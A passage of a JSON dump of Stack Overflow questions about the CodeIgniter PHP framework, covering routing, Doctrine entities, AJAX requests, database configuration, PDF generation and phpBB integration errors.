string(255)\n            notnull: true\n        slug:\n            type: string(255)\n            notnull: true\n        description:\n            type: string(255)\n    oneToMany:\n        items:\n            targetEntity: Item\n            orphanRemoval: true\n            mappedBy: type\n    manyToMany:\n        fields:\n            targetEntity: Field\n            inversedBy: types\n            joinTable:\n                name: fields_types\n                joinColumns:\n                    type_id:\n                        referencedColumnName: id\n                inverseJoinColumns:\n                    field_id:\n                        referencedColumnName: id\n    options:\n        charset: utf8\n        type: InnoDB\n</code></pre>\n\n<hr>\n\n<p>PHP</p>\n\n<p>Item</p>\n\n<pre><code>&lt;?php\n\nnamespace Entities;\n\nuse Doctrine\\ORM\\Mapping as ORM;\n\n/**\n * Entities\\Item\n */\nclass Item\n{\n    /**\n     * @var integer $id\n     */\n    private $id;\n\n    /**\n     * @var string $title\n     */\n    private $title;\n\n    /**\n     * @var string $description\n     */\n    private $description;\n\n    /**\n     * @var \\Doctrine\\Common\\Collections\\ArrayCollection\n     */\n    private $fields;\n\n    /**\n     * Constructor\n     */\n    public function __construct()\n    {\n        $this-&gt;fields = new \\Doctrine\\Common\\Collections\\ArrayCollection();\n    }\n\n    /**\n     * Get id\n     *\n     * @return integer \n     */\n    public function getId()\n    {\n        return $this-&gt;id;\n    }\n\n    /**\n     * Set title\n     *\n     * @param string $title\n     * @return Item\n     */\n    public function setTitle($title)\n    {\n        $this-&gt;title = $title;\n\n        return $this;\n    }\n\n    /**\n     * Get title\n     *\n     * @return string \n     */\n    public function getTitle()\n    {\n        return $this-&gt;title;\n    }\n\n    /**\n     * Set description\n     *\n     * @param string $description\n     * @return Item\n     */\n    public function setDescription($description)\n    {\n        $this-&gt;description = $description;\n\n        return $this;\n    }\n\n    /**\n     * Get description\n     *\n     * @return string \n     */\n    public function getDescription()\n    {\n        return $this-&gt;description;\n    }\n\n    /**\n     * Add fields\n     *\n     * @param Entities\\Field $fields\n     * @return Item\n     */\n    public function addField(\\Entities\\Field $fields)\n    {\n        $this-&gt;fields[] = $fields;\n\n        return $this;\n    }\n\n    /**\n     * Remove fields\n     *\n     * @param Entities\\Field $fields\n     */\n    public function removeField(\\Entities\\Field $fields)\n    {\n        $this-&gt;fields-&gt;removeElement($fields);\n    }\n\n    /**\n     * Get fields\n     *\n     * @return Doctrine\\Common\\Collections\\Collection \n     */\n    public function getFields()\n    {\n        return $this-&gt;fields;\n    }\n    /**\n     * @var Entities\\Type\n     */\n    private $types;\n\n\n    /**\n     * Set types\n     *\n     * @param Entities\\Type $types\n     * @return Item\n     */\n    public function setTypes(\\Entities\\Type $types = null)\n    {\n        $this-&gt;types = $types;\n\n        return $this;\n    }\n\n    /**\n     * Get types\n     *\n     * @return Entities\\Type \n     */\n    public function getTypes()\n    {\n        return $this-&gt;types;\n    }\n    /**\n     * @var Entities\\Type\n     */\n    private $type;\n\n\n    /**\n     * Set type\n     *\n     * @param Entities\\Type $type\n     * @return Item\n     */\n    public function setType(\\Entities\\Type $type = null)\n    {\n        $this-&gt;type = $type;\n\n        return $this;\n    }\n\n    /**\n     * Get type\n     *\n     * @return Entities\\Type \n     */\n    public function getType()\n    {\n        return $this-&gt;type;\n    }\n    /**\n     * @var string $slug\n     */\n    private $slug;\n\n\n    /**\n     * Set slug\n     *\n     * @param string $slug\n     * @return Item\n     */\n    public function setSlug($slug)\n    {\n        $this-&gt;slug = $slug;\n\n        return $this;\n    }\n\n    /**\n     * Get slug\n     *\n     * @return string \n     */\n    public function getSlug()\n    {\n        return $this-&gt;slug;\n    }\n}\n</code></pre>\n\n<p>Type</p>\n\n<pre><code>&lt;?php\n\nnamespace Entities;\n\nuse Doctrine\\ORM\\Mapping as ORM;\n\n/**\n * Entities\\Type\n */\nclass Type\n{\n    /**\n     * @var integer $id\n     */\n    private $id;\n\n    /**\n     * @var string $title\n     */\n    private $title;\n\n    /**\n     * @var string $description\n     */\n    private $description;\n\n    /**\n     * @var \\Doctrine\\Common\\Collections\\ArrayCollection\n     */\n    private $items;\n\n    /**\n     * Constructor\n     */\n    public function __construct()\n    {\n        $this-&gt;items = new \\Doctrine\\Common\\Collections\\ArrayCollection();\n    }\n\n    /**\n     * Get id\n     *\n     * @return integer \n     */\n    public function getId()\n    {\n        return $this-&gt;id;\n    }\n\n    /**\n     * Set title\n     *\n     * @param string $title\n     * @return Type\n     */\n    public function setTitle($title)\n    {\n        $this-&gt;title = $title;\n\n        return $this;\n    }\n\n    /**\n     * Get title\n     *\n     * @return string \n     */\n    public function getTitle()\n    {\n        return $this-&gt;title;\n    }\n\n    /**\n     * Set description\n     *\n     * @param string $description\n     * @return Type\n     */\n    public function setDescription($description)\n    {\n        $this-&gt;description = $description;\n\n        return $this;\n    }\n\n    /**\n     * Get description\n     *\n     * @return string \n     */\n    public function getDescription()\n    {\n        return $this-&gt;description;\n    }\n\n    /**\n     * Add items\n     *\n     * @param Entities\\Item $items\n     * @return Type\n     */\n    public function addItem(\\Entities\\Item $items)\n    {\n        $this-&gt;items[] = $items;\n\n        return $this;\n    }\n\n    /**\n     * Remove items\n     *\n     * @param Entities\\Item $items\n     */\n    public function removeItem(\\Entities\\Item $items)\n    {\n        $this-&gt;items-&gt;removeElement($items);\n    }\n\n    /**\n     * Get items\n     *\n     * @return Doctrine\\Common\\Collections\\Collection \n     */\n    public function getItems()\n    {\n        return $this-&gt;items;\n    }\n    /**\n     * @var \\Doctrine\\Common\\Collections\\ArrayCollection\n     */\n    private $fields;\n\n\n    /**\n     * Add fields\n     *\n     * @param Entities\\Field $fields\n     * @return Type\n     */\n    public function addField(\\Entities\\Field $fields)\n    {\n        $this-&gt;fields[] = $fields;\n\n        return $this;\n    }\n\n    /**\n     * Remove fields\n     *\n     * @param Entities\\Field $fields\n     */\n    public function removeField(\\Entities\\Field $fields)\n    {\n        $this-&gt;fields-&gt;removeElement($fields);\n    }\n\n    /**\n     * Get fields\n     *\n     * @return Doctrine\\Common\\Collections\\Collection \n     */\n    public function getFields()\n    {\n        return $this-&gt;fields;\n    }\n    /**\n     * @var string $slug\n     */\n    private $slug;\n\n\n    /**\n     * Set slug\n     *\n     * @param string $slug\n     * @return Type\n     */\n    public function setSlug($slug)\n    {\n        $this-&gt;slug = $slug;\n\n        return $this;\n    }\n\n    /**\n     * Get slug\n     *\n     * @return string \n     */\n    public function getSlug()\n    {\n        return $this-&gt;slug;\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-routing"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13258683,"title":"Codeigniter 2.x i18n routing is redirecting me to 404_error","body":"<p>I use the library provided in this url: <a href=\"http://maestric.com/doc/php/codeigniter_i18n\" rel=\"nofollow\">http://maestric.com/doc/php/codeigniter_i18n</a>\n.\nThe problem is when I try routing to ar/function it works but when I try ar/function/method/arg it doesn't work. Here is a code example</p>\n\n<p>Works:</p>\n\n<pre><code>$route['users/sign_in'] = \"users/sign_in\";\n</code></pre>\n\n<p>Doesn't work:</p>\n\n<pre><code>$route['vehicle/(:num)'] = \"vehicle/vehicle_by_id/$1\";\n</code></pre>\n\n<p>I have followed all the instructions provided in the in the above link but I still get 404 error.</p>\n\n<p>To clarify, I also have this in my routes.php:</p>\n\n<pre><code>$route['^ar/(.+)$'] = \"$1\";\n$route['^ar$'] = $route['default_controller']; \n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["php","codeigniter","activerecord","mysqli"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":30,"score":-5,"question_id":13258232,"title":"Query for a users status type","body":"<p>I am trying to come up with a query in codeigniter where I can list users with a specific status or specific statuses. My statuses are numeric in a column called <code>status_id</code>. So lets say for the sake of example. <code>0</code> means inactive, unverified. <code>1</code> means active, verified. <code>2</code> means suspended/banned. In some cases I want to list only the people unverified, sometimes only the active. However other times I want to list them all, but grouped together. I also in some cases need to break this down a bit further, to pull based on whether a user is a standard user or an admin. The column for that is <code>user_type</code>. I know Im going to have to eventually do a <code>JOIN</code> in order to get the details of the user but for now Im fine grabbing just the ID's (also numeric) of each member.</p>\n\n<p>What I would like to do in the long run is build a reusable function, that I can use for all instances by passing parameters to the function. That will dynamically build the query that will give me results I am looking for. Problem is I am not sure where to begin outside of.</p>\n\n<pre><code>public function get_users($params = array())\n{\n    if(count($params) == 0)\n    {\n       $this-&gt;db-&gt;select();\n       $this-&gt;db-&gt;from('users');\n    }\n    else\n    {\n       //questionable code to build dynamic query.\n    }\n  return $query_result;\n}\n\n//then Id like to be able to call it from my controllers like.\n$this-&gt;users_model-&gt;get_users();\n</code></pre>\n"},{"tags":["codeigniter","url","jquery-ajax"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":13225354,"title":"Codeigniter stacking url","body":"<p>I am having this problem of url stacking up. I used jquery ajax request on my localhost and the url became\nlocalhost/website/index.php/mycontroller/myfunction/mycontroller/mynewfunction instead of\nlocalhost/website/index.php/mycontroller/mynewfunction/para1/para2.</p>\n\n<p>Does anyone know why? I have been trying to fix this problem for the whole day. Everywhere I checked that has a url or link appears to be right.</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13255506,"title":"Page not found upon jquery request","body":"<p>I'm trying to figure out what I'm doing wrong here. I have this for my jQuery code and I also have a php controller function called delete that looks like this. Right now when I cxlick on the element with a class of delete it tries to make a request to this page and it can not be found.</p>\n\n<pre><code>mysite.com/cms/ctrlpanel/users/delete \n\npublic function delete($user_id)\n{\n}    \n\n$route['cms/ctrlpanel/users/delete/(:num)'] = 'users/delete/$1';\n\n$('.delete').click(function(e){\n    var element = $(this);\n    e.preventDefault();\n    $.post('/cms/ctrlpanel/users/delete', { 'user_id' : element.attr('rel') }, function(data) \n    {\n\n    ), 'json');\n});\n</code></pre>\n"},{"tags":["codeigniter","storage-engines"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13244376,"title":"Got error 28 from storage engine","body":"<p>My website used CodeIgnter framework and host with iPage. Before, my PHP version is 5.2, then i update it to 5.3. After i updated to PHP 5.3 always get error as below:</p>\n\n<pre><code>- Got error 28 from storage engine\n- Incorrect key file for table '/mysql-tmp/#sql_16c4_0.MYI'. try to repair it\n- Got error -1 from storage engine\n</code></pre>\n\n<p>It's not a new question in StackOverflow, but I want to make sure that:</p>\n\n<ul>\n<li>Does these error cause from my update from PHP 5.2 to 5.3?</li>\n<li>Does it cause from my misconfiguration in php.ini?</li>\n<li>From hosting? or any others?</li>\n</ul>\n"},{"tags":["codeigniter","pdf","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13253316,"title":"Codeigniter - Snapshot of the view - Generate PDF","body":"<p>I want to create a pdf based on one view, generated by Codeigniter. However, this view has a lot of styled elements, and media queries associated with them, so the rendered pdf doesn't correspond at all, with the desired final document.</p>\n\n<p>What's the best way to acomplish this? Right now I'm using mPDF. Is there anyway to take a snapshot of the view and then generate a pdf with it, so the associated styles render correctly on the document?</p>\n\n<p>Right now my code looks like this</p>\n\n<pre><code>public function generatePDF()\n    {\n        $this-&gt;session_expire();\n    $this-&gt;load-&gt;helper('url');\n    $user_id=$this-&gt;session-&gt;userdata('user_id');\n    $this-&gt;user_model=$this-&gt;db_interface-&gt;db_get_user($user_id);\n    //  $this-&gt;load-&gt;helper('url');\n\n\n        //echo('error aki &lt;br /&gt;');\n        $data['user'] = $this-&gt;user_model;\n        $data['objective'] = $this-&gt;db_interface-&gt;db_get_objectives($this-&gt;user_model-&gt;get_id());\n        $data['list_work'] = $this-&gt;db_interface-&gt;db_get_list_work_experience($this-&gt;user_model-&gt;get_id());\n        $data['list_education'] = $this-&gt;db_interface-&gt;db_get_list_education($this-&gt;user_model-&gt;get_id());\n        $data['list_skills'] = $this-&gt;db_interface-&gt;db_get_skills($this-&gt;user_model-&gt;get_id());\n        $data['list_personal'] = $this-&gt;db_interface-&gt;db_get_personal_skills($this-&gt;user_model-&gt;get_id());\n        $data['list_links'] = $this-&gt;db_interface-&gt;get_user_links($this-&gt;user_model-&gt;get_id());\n\n\n        $html = $this-&gt;load-&gt;view('display_user',$data,TRUE);\n        //$html = $this-&gt;load-&gt;view('display_user',$data,TRUE);\n       // $this-&gt;load-&gt;view('display_user',  $html);\n        $this-&gt;mpdf-&gt;WriteHTML($html);\n        $this-&gt;mpdf-&gt;Output();\n\n    }\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["codeigniter","uploadify"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13254115,"title":"Uploadify - $_FILES['upload'] is not set (emtpy)","body":"<p>I have the following code:</p>\n\n<pre><code>  &lt;input type=\"hidden\" value=\"&lt;?=base_url()?&gt;\" id=\"hiddenBaseUrl\"&gt;\n  &lt;input type=\"hidden\" value=\"&lt;?='./uploads/'?&gt;\" id=\"uploadfolder\"&gt;\n  &lt;input type=\"file\" name=\"upload\" id=\"file_upload\" class=\"btn large primary\"/&gt;\n</code></pre>\n\n<p>And:</p>\n\n<pre><code>    $(document).ready(function () {\n  var base_url = $('#hiddenBaseUrl').val();\n  var uploadfolder = $('#uploadfolder').val();  \n  $('#file_upload').uploadify({\n    'swf'  : base_url + '/template/uploadify.swf',\n    'uploader'    : base_url + '/index.php/admin/upload/',\n    'cancelImg' : base_url + '/template/images/cancel.png',\n    'folder'    : uploadfolder,\n    'fileExt'     : '*.jpg;*.gif;*.png;*.zip;*.rar;*.flv;*.mp4;*.mp3',\n    'auto'      : false,\n    'multi'     : true,\n    'uploadLimit' : 10\n    });\n});\n</code></pre>\n\n<p>When I submit my form using <code>&lt;input type=\"submit\" /&gt;</code> and <code>var_dump($_FILES)</code> I get the following message and the array is empty: </p>\n\n<blockquote>\n  <p>Message: Undefined index: upload</p>\n</blockquote>\n"},{"tags":["php","mysql","codeigniter","connection","mysqli"],"answer_count":5,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":14816,"score":2,"question_id":7254049,"title":"CodeIgniter: Unable to connect to your database server using the provided settings Error Message","body":"<p>I have been using CI just fine using the MySQL driver. I want to use the mysqli driver instead, but as soon as I change it (just add the ‘i’ at the end of mysql, and added the port number) I get the following error message</p>\n\n<pre><code>A Database Error Occurred\n\nUnable to connect to your database server using the provided settings.\n\nFilename: core/Loader.php\n\nLine Number: 232 \n</code></pre>\n\n<p>my setting look like this:</p>\n\n<pre><code>$db['default']['hostname'] = $hostname;\n$db['default']['username'] = $username;\n$db['default']['password'] = $password;\n$db['default']['database'] = $database;\n$db['default']['dbdriver'] = 'mysqli';\n$db['default']['port']     = \"3306\";  \n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = TRUE;\n$db['default']['db_debug'] = TRUE;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE; \n\nwhere\n$hostname = 'localhost';\n$username = 'myusernamegoeshere';\n$password = 'mypasswordgoeshere';\n$database = 'mydatabasenamegoeshere'; \n</code></pre>\n\n<p>Using:\nCI 2.0.2\nphp 5.3.4\nApache/2.2.17 (Unix)\nmysql 5.5.13\nmysql.default_port 3306</p>\n\n<p>Am I doing anything wrong?</p>\n\n<p>Thank you,</p>\n"},{"tags":["javascript","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13253081,"title":"Codeigniter trouble sending php var into javascript and .load content","body":"<p>Im having troubles sending a variable from php to javascript.</p>\n\n<p>I pull javascript (Ajax) trough this link.</p>\n\n<pre><code>&lt;script src=\"&lt;?php echo base_url().'assets/js/main.js' ?&gt;\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>In my <code>main.js</code> :</p>\n\n<pre><code>var base_url = '&lt;?php echo base_url(); ?&gt;';\nvar language = '&lt;?php echo $language; ?&gt;';\n</code></pre>\n\n<p>Im trying to load content dynamically without refresh webpage, by using ajax <code>.load</code> this way:</p>\n\n<pre><code>var addressValue = $(this).children('a').attr(\"href\");\n\n$('#conteudo').fadeOut(\"slow\").load(addressValue+'/index.php?idioma='+language+' #conteudo').hide().fadeIn(\"slow\")\n</code></pre>\n\n<p>I can load perfectly with the <code>addressValue</code> onyl.\nBut when i try the way above, my language won't echo.\nIf instead of using <code>language</code>  i put the language i want without variable e.g. portuguese it works like a charm.\nim working with multilanguage so i need to pull the content in the language the user did choose.</p>\n\n<p>This is how user can set language</p>\n\n<pre><code>&lt;ul class=\"nav pull-right language\" id=\"barra_de_idiomas\"&gt;\n    &lt;li&gt;&lt;?php echo anchor(($this-&gt;uri-&gt;uri_string()).\"?idioma=english\",'&amp;nbsp;', 'class=\"language\" id=\"en\"') ?&gt;&lt;/li&gt;\n    &lt;li&gt;&lt;?php echo anchor(($this-&gt;uri-&gt;uri_string()).\"?idioma=portuguese\",'&amp;nbsp;', 'class=\"language\" id=\"pt\"') ?&gt;&lt;/li&gt;\n    &lt;li&gt;&lt;?php echo anchor(($this-&gt;uri-&gt;uri_string()).\"?idioma=german\",'&amp;nbsp;', 'class=\"language\" id=\"de\"') ?&gt;&lt;/li&gt;\n    &lt;li&gt;&lt;?php echo anchor(($this-&gt;uri-&gt;uri_string()).\"?idioma=french\",'&amp;nbsp;', 'class=\"language\" id=\"fr\"') ?&gt;&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>And my construct from controller:</p>\n\n<pre><code>    $this-&gt;load-&gt;library('user_agent');\n    if ($this-&gt;config-&gt;item('language') == '') {\n        if($this-&gt;input-&gt;get('idioma') == true) {\n            $this-&gt;config-&gt;set_item('language', $this-&gt;input-&gt;get('idioma'));\n        } elseif ($this-&gt;agent-&gt;accept_lang('en')) {\n            $this-&gt;config-&gt;set_item('language', 'english');\n        } elseif ($this-&gt;agent-&gt;accept_lang('de')) {\n            $this-&gt;config-&gt;set_item('language', 'german');\n        } elseif ($this-&gt;agent-&gt;accept_lang('pt')) {\n            $this-&gt;config-&gt;set_item('language', 'portuguese');\n        } else {\n            $this-&gt;config-&gt;set_item('language', 'portuguese');\n        }\n    }\n    $language = $this-&gt;config-&gt;item('language');\n    $data['language'] = $language;\n    $this-&gt;load-&gt;vars($data);\n</code></pre>\n"},{"tags":["php","api","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13252050,"title":"CodeIgniter RESTful API rate limiting issue","body":"<p>I am working with the following code written by Phil Sturgeon here: <a href=\"https://github.com/philsturgeon/codeigniter-restserver\" rel=\"nofollow\">https://github.com/philsturgeon/codeigniter-restserver</a></p>\n\n<p>No where in his docs can I see how the limit option is setup in side of the controller.</p>\n\n<p>the RESTController controller file has some references e.g.</p>\n\n<p>Line 654: <a href=\"https://github.com/philsturgeon/codeigniter-restserver/blob/master/application/libraries/REST_Controller.php\" rel=\"nofollow\">https://github.com/philsturgeon/codeigniter-restserver/blob/master/application/libraries/REST_Controller.php</a></p>\n\n<p>Shows the protected function, additionally there is:</p>\n\n<pre><code> // How many times can you get to this method an hour?\n $limit = $this-&gt;methods[$controller_method]['limit'];\n</code></pre>\n\n<p>And from the rest.php config:</p>\n\n<blockquote>\n  <p>/*\n  |-------------------------------------------------------------------------- | REST Enable Limits\n  |-------------------------------------------------------------------------- | | When set to true REST_Controller will count the number of uses of\n  each method | by an API key each hour. This is a general rule that can\n  be overridden in the | $this->method array in each controller. |</p>\n</blockquote>\n\n<p>Can anyone help me with this please? Pulling my hair out currently :-)</p>\n\n<p>One of my controllers methods as it currently stands:</p>\n\n<pre><code>function listservices_get()\n{\n    $organisation_id = $this-&gt;get('id');\n    $organisations = $this-&gt;api_buyus_model-&gt;list_services($organisation_id);\n\n    if($organisations)\n    {\n            $this-&gt;response($organisations, 200);\n    }\n    else\n    {\n            $this-&gt;response(array('error' =&gt; '1', 'errorDesc' =&gt; 'Buy us services list could not be retrieved.'), 400);\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","phpbb","phpbb3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13245146,"title":"Codeigniter-phpBB integration","body":"<p>I have tried to integrate phpBB forum in Codeigniter project. I have placed the library provided by codeigniter(<a href=\"https://github.com/EllisLab/CodeIgniter/wiki/phpBB3-library\" rel=\"nofollow\">phpbb library</a>) inside the projectName/application/libraries  and placed the forum at the root of the project.  The controller looks like this:</p>\n\n<pre><code>&lt;?php\nclass Library_test extends CI_Controller\n{\n    function __construct()\n    {\n        parent::__construct();\n\n        $this-&gt;load-&gt;database();\n        $this-&gt;load-&gt;library('session');\n        $this-&gt;load-&gt;library('phpbb_library');\n    }\n\n    function index()\n    {\n        if ($this-&gt;phpbb_library-&gt;isLoggedIn() === TRUE)\n        {\n            $userId = $this-&gt;phpbb_library-&gt;getUserInfo('user_id');\n            $username = $this-&gt;phpbb_library-&gt;getUserInfo('username');\n\n            echo \"Welcome $username (\" . ($this-&gt;phpbb_library-&gt;isAdministrator() === TRUE ? \"administrator\" : \"user\") . \"), your ID is $userId and you are member of the following groups\";\n\n            foreach ($this-&gt;phpbb_library-&gt;getUserGroupMembership() as $group)\n            {\n                echo \"$group &lt;br /&gt;\";\n            }\n        }\n        else\n        {\n            echo \"You are not logged-in.\";\n        }\n    }\n}\n?&gt;\n</code></pre>\n\n<p>I have set appropriate permission for the whole project (chmod -R 777 project/) and the files that the error says as \"not found\" are there and accessible. Please help me out.</p>\n\n<p>Following is the error when I try to access the controller.</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/common.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 32</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/common.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 32</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/config.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 33</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/config.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 33</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/includes/functions_user.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 34</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/includes/functions_user.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 34</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/includes/functions_display.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 35</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/includes/functions_display.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 35</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/includes/functions_privmsgs.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 36</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/includes/functions_privmsgs.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 36</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(localhost/communityCI/community/includes/functions_posting.php): failed to open stream: No such file or directory</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 37</p>\n\n<p></p>\n\nA PHP Error was encountered\n\n<p>Severity: Warning</p>\n\n<p>Message:  include(): Failed opening 'localhost/communityCI/community/includes/functions_posting.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')</p>\n\n<p>Filename: libraries/phpbb.php</p>\n\n<p>Line Number: 37</p>\n\n<p>\nFatal error: Call to a member function session_begin() on a non-object in /var/www/communityCI/application/libraries/phpbb.php on line 39</p>\n"}]}
{"total":13987,"page":2,"pagesize":100,"questions":[{"tags":["codeigniter","controller","route","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13239329,"title":"How to route all module of HMVC to single controller CI","body":"<p>i use HMVC with CI last version andi want to route all module of HMVC to a controller CI</p>\n\n<p>If i use </p>\n\n<pre><code>$route[‘admin/(:any)’] = “admin/”;\n$route[’(:any)’] = “index/index/$1”;\n$route[’(:any)/(:any)’] = “index/index/$1/$2”;\n$route[’(:any)/(:any)/(:any)’] = “index/index/$1/$2/$3”;\n</code></pre>\n\n<p>is not a solution, because a url can have many segments</p>\n\n<p>i want to route the controller, method, and all parameters, like this:</p>\n\n<pre><code>$route[’(:any)/(:any)/ *all parameters *’] = “index/index/$1/$2/ *array($parameters)*”;\n</code></pre>\n\n<p>or how can stop the route of HMVC, i don`t need the route of HMVC.</p>\n\n<p>Pls help.</p>\n\n<p>Thanks, Jhon.</p>\n"},{"tags":["javascript","codeigniter","formatting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13250803,"title":"CodeIgniter function breaks with Javascript","body":"<p>I'm using CodeIgniter form helper, and this is what it does:</p>\n\n<blockquote>\n  <p>Uncaught SyntaxError: Unexpected token ILLEGAL</p>\n</blockquote>\n\n<p>The code:</p>\n\n<pre><code>jQuery('#window-1').append('&lt;?= form_dropdown('hfdata', $hf_arr, set_value('hfdata'), 'class=\"span3\"') ?&gt;');\n</code></pre>\n\n<p>As you can see, I'm using a PHP inside of a JS, when I do <code>&lt;?= 'Test' ?&gt;</code> it works.<br>\nSo it seems like its related with the CodeIgniter function.</p>\n\n<p>As far as i know this error message can be caused by unknown/wrong characters in the code, and from what I saw in the firebug, this CI function is generating text with tabs and line breaks... and that is my problem I guess.</p>\n\n<p>I may be wrong, so please correct me if so.</p>\n\n<p>I will appreciate any solution for this problem.</p>\n"},{"tags":["php","codeigniter","variables","calendar"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13251104,"title":"get {day} value in variable with codeigniter calendar","body":"<p>In my codeigniter calendar I have this template (taken from codeigniter user guide):</p>\n\n<pre><code>{table_open}&lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"500\" id=\"tabellaPrenotazioni\"&gt;{/table_open}\n{heading_row_start}&lt;tr&gt;{/heading_row_start}\n{heading_previous_cell}&lt;th&gt;&lt;a href=\"{previous_url}\"&gt;&amp;lt;&amp;lt;&lt;/a&gt;&lt;/th&gt;{/heading_previous_cell}\n{heading_title_cell}&lt;th colspan=\"{colspan}\"&gt;{heading}&lt;/th&gt;{/heading_title_cell}\n{heading_next_cell}&lt;th&gt;&lt;a href=\"{next_url}\"&gt;&amp;gt;&amp;gt;&lt;/a&gt;&lt;/th&gt;{/heading_next_cell}\n\n{heading_row_end}&lt;/tr&gt;{/heading_row_end}\n\n{week_row_start}&lt;tr&gt;{/week_row_start}\n{week_day_cell}&lt;td&gt;{week_day}&lt;/td&gt;{/week_day_cell}\n{week_row_end}&lt;/tr&gt;{/week_row_end}\n\n{cal_row_start}&lt;tr class=\"rigaGiorni\"&gt;{/cal_row_start}\n{cal_cell_start}&lt;td class=\"cellaGiorno\"&gt;{/cal_cell_start}\n\n{cal_cell_content}&lt;a href=\"{content}\"&gt;{day}&lt;/a&gt;{/cal_cell_content}\n{cal_cell_content_today}&lt;div class=\"highlight\"&gt;&lt;a href=\"{content}\"&gt;{day}&lt;/a&gt;&lt;/div&gt;{/cal_cell_content_today}\n\n{cal_cell_no_content}{day}{/cal_cell_no_content}\n{cal_cell_no_content_today}&lt;div class=\"highlight\"&gt;&lt;b&gt;{day}&lt;/b&gt;&lt;/div&gt;{/cal_cell_no_content_today}\n\n{cal_cell_blank}&amp;nbsp;{/cal_cell_blank}\n\n{cal_cell_end}&lt;/td&gt;{/cal_cell_end}\n{cal_row_end}&lt;/tr&gt;{/cal_row_end}\n\n{table_close}&lt;/table&gt;{/table_close}\n</code></pre>\n\n<p>I need to programmatically add somethings to each day according to which day it is, so I need to save {day} value in a php variable. How can I 